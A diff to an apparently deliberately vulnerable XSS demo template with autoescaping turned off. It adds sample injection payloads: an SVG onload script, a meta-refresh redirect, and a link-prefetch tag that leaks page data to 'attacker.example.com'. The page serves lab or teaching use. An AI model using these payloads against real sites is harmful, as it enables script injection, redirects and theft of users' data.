@@ -16,6 +16,20 @@
 <i>
 <p>Try this:</p>
 <p>&lt;script&gt;alert('Watch out!')&lt;/script&gt;</p>
+<p><b>Omit csp:</b></p>
+<p> &lt;textarea&gt;</p>
+<p>
+<code>
+    &lt;svg onload="alert(1);" width="1000" height="1000">
+    &lt;circle cx="400" cy="400" r="400" stroke="green" stroke-width="10" fill="red" /&gt;
+    &lt;/svg&gt;
+</code>
+</p>
+
+<p>Instant redirect: &lt;meta http-equiv="refresh" content="0;url=http://tomatosoup.pl"&gt;
+</p>
+<p>Link prefetching:</p>
+<p>&lt;link rel='prefetch' href='http://attacker.example.com/?log=</p>
 
 </i>
 {% autoescape off %}
